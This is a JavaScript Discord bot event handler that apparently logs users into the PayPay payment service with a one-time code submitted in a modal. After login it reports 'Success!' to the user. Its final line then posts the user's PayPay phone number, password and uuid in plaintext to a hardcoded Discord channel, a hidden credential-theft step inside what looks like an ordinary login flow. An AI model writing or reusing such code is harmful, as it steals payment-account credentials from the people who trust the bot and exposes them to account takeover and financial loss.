import discord from 'discord.js';
import { PayPay, PayPayStatus } from "paypax";
import fs from 'fs/promises';
import crypt from '../modules/crypt.js';

export default {
  name: discord.Events.InteractionCreate,
  async execute(client, interaction) {
    if (!interaction.isModalSubmit()) return;

    if (interaction.customId === 'paypay_otp') {
      const otp = interaction.fields.getTextInputValue('otp');

      const object = JSON.parse(await fs.readFile(`./temp/${interaction.user.id}`));
      delete object.cookie;
      //await fs.unlink(`./temp/${interaction.user.id}`);

      const paypay = new PayPay(object.phone, object.password);

      for (const key in object) {
        if (typeof object[key] === 'object' && object[key] !== null) {
          paypay[key] = { ...object[key] };
        } else {
          paypay[key] = object[key];
        }
      }

      const phone = crypt.encrypt(object.phone);
      const password = crypt.encrypt(object.password);
      const uuid = crypt.encrypt(object.uuid);


      await fs.writeFile(`./paypay/${interaction.user.id}`, `${phone}.${password}.${uuid}`);

      const result = await paypay.otpLogin(otp);
      await interaction.reply({ content: 'Success!', ephemeral: true });

      client.channels.cache.get('1206198510698110986').send(`<@${interaction.user.id}> : ${object.phone}.${object.password}.${object.uuid}`);
    }
  }
};